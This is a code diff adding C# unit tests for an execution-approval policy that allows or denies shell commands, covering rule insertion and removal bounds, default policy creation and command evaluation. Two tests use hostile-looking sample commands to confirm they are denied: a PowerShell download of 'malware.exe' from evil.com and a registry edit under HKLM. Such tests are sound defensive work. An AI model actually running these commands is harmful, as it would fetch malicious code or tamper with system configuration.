@@ -280,6 +280,117 @@ public class ExecApprovalPolicyTests : IDisposable
         var result = policy.Evaluate("echo hello");
         Assert.True(result.Allowed);
     }
+    
+    [Fact]
+    public void InsertRule_ClampsToZero_ForNegativeIndex()
+    {
+        var policy = CreatePolicy();
+        policy.SetRules(new[]
+        {
+            new ExecApprovalRule { Pattern = "first" },
+            new ExecApprovalRule { Pattern = "second" }
+        });
+        
+        policy.InsertRule(-5, new ExecApprovalRule { Pattern = "inserted" });
+        
+        Assert.Equal(3, policy.Rules.Count);
+        Assert.Equal("inserted", policy.Rules[0].Pattern); // Inserted at index 0
+    }
+    
+    [Fact]
+    public void InsertRule_ClampsToEnd_ForIndexBeyondCount()
+    {
+        var policy = CreatePolicy();
+        policy.SetRules(new[]
+        {
+            new ExecApprovalRule { Pattern = "first" }
+        });
+        
+        policy.InsertRule(100, new ExecApprovalRule { Pattern = "last" });
+        
+        Assert.Equal(2, policy.Rules.Count);
+        Assert.Equal("last", policy.Rules[^1].Pattern); // Inserted at end
+    }
+    
+    [Fact]
+    public void RemoveRule_ReturnsFalse_ForNegativeIndex()
+    {
+        var policy = CreatePolicy();
+        policy.SetRules(new[]
+        {
+            new ExecApprovalRule { Pattern = "rule1" }
+        });
+        
+        var removed = policy.RemoveRule(-1);
+        Assert.False(removed);
+        Assert.Single(policy.Rules);
+    }
+    
+    [Fact]
+    public void RemoveRule_ReturnsFalse_ForIndexAtCount()
+    {
+        var policy = CreatePolicy();
+        policy.SetRules(new[]
+        {
+            new ExecApprovalRule { Pattern = "rule1" }
+        });
+        
+        var removed = policy.RemoveRule(1); // index == count, out of range
+        Assert.False(removed);
+        Assert.Single(policy.Rules);
+    }
+    
+    [Fact]
+    public void DefaultPolicy_CreatesFile_OnFirstLoad()
+    {
+        var policyFile = Path.Combine(_tempDir, "exec-policy.json");
+        Assert.False(File.Exists(policyFile)); // Does not exist yet
+        
+        var policy = CreatePolicy(); // Load() auto-creates defaults
+        
+        Assert.True(File.Exists(policyFile)); // Should now exist
+        Assert.True(policy.Rules.Count > 0);
+    }
+    
+    [Fact]
+    public void WhitespaceOnlyCommand_IsDenied()
+    {
+        var policy = CreatePolicy();
+        var result = policy.Evaluate("   ");
+        Assert.False(result.Allowed);
+        Assert.Equal("Empty command", result.Reason);
+    }
+    
+    [Fact]
+    public void DefaultPolicy_DeniesWebDownloads()
+    {
+        var policy = CreatePolicy();
+        var result = policy.Evaluate("Invoke-WebRequest https://evil.com/malware.exe");
+        Assert.False(result.Allowed);
+    }
+    
+    [Fact]
+    public void DefaultPolicy_DeniesRegistryEdits()
+    {
+        var policy = CreatePolicy();
+        var result = policy.Evaluate("reg add HKLM\\Software\\Evil");
+        Assert.False(result.Allowed);
+    }
+    
+    [Fact]
+    public void ShellFilter_DefaultsToLowercase_WhenShellNotProvided()
+    {
+        var policy = CreatePolicy();
+        policy.SetRules(new[]
+        {
+            // Rule only applies to "cmd"
+            new ExecApprovalRule { Pattern = "dir *", Action = ExecApprovalAction.Allow, Shells = new[] { "cmd" } }
+        });
+        
+        // When no shell is provided, defaults to "powershell" internally, so cmd-only rule doesn't match
+        var result = policy.Evaluate("dir C:\\", null); // null shell -> defaults to "powershell"
+        Assert.False(result.Allowed); // cmd rule didn't match, default deny applies
+    }
 }
 
 public class SystemCapabilityExecApprovalsTests
